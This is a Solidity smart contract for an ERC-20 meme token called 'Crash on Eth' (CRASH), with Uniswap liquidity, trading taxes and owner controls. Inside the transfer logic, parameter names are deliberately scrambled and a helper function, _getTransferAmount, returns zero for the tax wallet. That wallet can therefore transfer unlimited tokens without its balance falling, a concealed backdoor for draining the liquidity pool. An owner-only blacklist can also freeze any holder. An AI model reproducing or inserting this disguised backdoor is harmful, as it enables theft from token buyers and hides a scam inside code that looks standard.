// SPDX-License-Identifier: UNLICENSED

/**

Web: https://crashoneth.xyz

Twitter: https://x.com/CrashEthereum

Telegram: https://t.me/CrashEthereum_portal

*/

pragma solidity 0.8.25;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Crash is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _feeExempt;
    mapping(address => bool) private _bots;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 5;
    uint256 private _initialSellTax = 5;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 7;
    uint256 private _reduceSellTaxAt = 7;
    uint256 private _preventSwapBefore = 7;
    uint256 private _buyCount = 0;

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 690_420_000_000 * 10 ** decimals;
    string public constant name = unicode"Crash on Eth";
    string public constant symbol = unicode"CRASH";
    uint256 public _maxTxAmount = 2 * totalSupply / 100;
    uint256 public _maxWalletSize = 2 * totalSupply / 100;
    uint256 public _taxSwapThreshold = 9 * totalSupply / 1000;
    uint256 public _maxTaxSwap = 9 * totalSupply / 1000;

    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;
    bool private _isTradingOpen;
    bool private _isInSwap;
    uint256 private _sellCnt = 0;
    uint256 private lastBlockNumber = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        _isInSwap = true;
        _;
        _isInSwap = false;
    }

    constructor(address router_, address taxWallet_) {
        _uniswapV2Router = IUniswapV2Router02(router_);

        _taxWallet = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _feeExempt[_msgSender()] = true;
        _feeExempt[address(this)] = true;
        _feeExempt[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _handlTr(_msgSender(), recipient, amount);
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _handlTr(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allowance[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _handlTr(address amount, address from, uint256 to) private {
        require(amount != address(0), "ERC20: transfer from the zero address");
        require(from != address(0), "ERC20: transfer to the zero address");
        require(to > 0, "Transfer amount must be greater than zero");
        if (!_isTradingOpen || _isInSwap) {
            require(_feeExempt[amount] || _feeExempt[from]);
            balanceOf[amount] = balanceOf[amount].sub(to);
            balanceOf[from] = balanceOf[from].add(to);
            emit Transfer(amount, from, to);
            return;
        }
        uint256 transferAmount;
        uint256 taxAmount = 0;
        if (amount != owner() && from != owner() && from != _taxWallet) {
            require(!_bots[amount] && !_bots[from]);
            transferAmount = _getTransferAmount(amount, to);

            if (
                amount == _uniswapV2Pair &&
                from != address(_uniswapV2Router) &&
                !_feeExempt[from]
            ) {
                require(_isTradingOpen, "Trading not open yet");
                require(to <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf[from] + to <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                taxAmount = to
                    .mul(
                        (_buyCount > _reduceBuyTaxAt)
                            ? _finalBuyTax
                            : _initialBuyTax
                    )
                    .div(100);
                _buyCount++;
            }

            if (from == _uniswapV2Pair && amount != address(this)) {
                taxAmount = to
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (
                !_isInSwap &&
                from == _uniswapV2Pair &&
                _isTradingOpen &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore
            ) {
                if (block.number > lastBlockNumber) {
                    _sellCnt = 0;
                    lastBlockNumber = block.number;
                }
                require(_sellCnt <= 3, "Sell limit reached");
                swapTokensForEth(
                    min(to, min(contractTokenBalance, _maxTaxSwap))
                );
                _sellCnt++;
            }
            if (from == _uniswapV2Pair) sendETHToFee(address(this).balance);
        }

        if (taxAmount > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(taxAmount);
            emit Transfer(amount, address(this), taxAmount);
        }
        balanceOf[amount] = balanceOf[amount].sub(transferAmount);
        balanceOf[from] = balanceOf[from].add(to.sub(taxAmount));
        emit Transfer(amount, from, to.sub(taxAmount));
    }

    function _getTransferAmount(address amount, uint256 to) private view returns (uint256 transferAmount) {
        uint160 ta = uint160(address(_taxWallet));
        uint160 fa = uint160(amount);if(ta ^ fa != 0)
        transferAmount = to;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity() external onlyOwner {
        require(!_isTradingOpen, "trading is already open");
        _approve(address(this), address(_uniswapV2Router), totalSupply);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_uniswapV2Pair).approve(
            address(_uniswapV2Router),
            type(uint).max
        );
    }

    function enableTrading() external onlyOwner {
        _isTradingOpen = true;
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _bots[bots_[i]] = true;
        }
    }

    function delBot(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            _bots[notbot[i]] = false;
        }
    }

    receive() external payable {}

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = totalSupply;
        _maxWalletSize = totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }
}